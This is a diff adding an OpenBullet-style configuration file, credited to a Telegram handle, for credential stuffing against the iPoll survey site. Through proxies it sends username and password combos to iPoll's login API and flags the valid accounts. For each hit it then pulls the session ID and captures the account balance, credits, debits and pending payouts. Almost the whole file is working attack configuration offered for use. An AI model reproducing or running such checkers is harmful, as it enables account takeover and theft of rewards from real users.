@@ -1,0 +1,112 @@
+[SETTINGS]
+{
+  "Name": "ipoll",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-04-08T11:27:21.8450762+02:00",
+  "AdditionalInfo": "https://t.me/Koko_Nader",
+  "Author": "𝙶𝙴𝙾𝚁𝙶𝙴 𝙽𝙰𝙳𝙴𝚁 (🔥)/@Koko_Nader",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#tm FUNCTION CurrentUnixTime -> VAR "tm" 
+
+REQUEST POST "https://flare.ipoll.com/api/1/respondent/login?_cache=<tm>" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"panelId\":2333,\"keepLogin\":false}" 
+  CONTENTTYPE "text/plain" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 72" 
+  HEADER "Content-Type: text/plain" 
+  HEADER "Host: flare.ipoll.com" 
+  HEADER "Origin: https://www.ipoll.com" 
+  HEADER "Referer: https://www.ipoll.com/" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36" 
+  HEADER "panelDomainId: 23331" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" Contains "200" 
+    KEY "sessionExpDate" 
+    KEY "sessionId" 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "400" 
+    KEY "{\"errorCode\":\"error_invalidCredentials\"}]" 
+
+#sessionId PARSE "<SOURCE>" JSON "sessionId" -> VAR "sessionId" "https://goggles.mw.dynata.com/api/v1/respondent/balance?session=" "" 
+
+REQUEST GET "<sessionId>" 
+  
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "origin: https://www.ipoll.com" 
+  HEADER "paneldomainid: 23331" 
+  HEADER "referer: https://www.ipoll.com/" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36" 
+
+#amount PARSE "<SOURCE>" LR "amount\":" "," CreateEmpty=FALSE -> CAP "amount" 
+
+#credits PARSE "<SOURCE>" LR "credits\":" "," CreateEmpty=FALSE -> CAP "credits" 
+
+#debits PARSE "<SOURCE>" LR "debits\":" "," CreateEmpty=FALSE -> CAP "debits" 
+
+#pending PARSE "<SOURCE>" LR "pending\":" "}," CreateEmpty=FALSE -> CAP "pending" 
+
+FUNCTION Constant "𝙶𝙴𝙾𝚁𝙶𝙴 𝙽𝙰𝙳𝙴𝚁 (🔥)/@Koko_Nader" -> CAP "Checked by" 
+
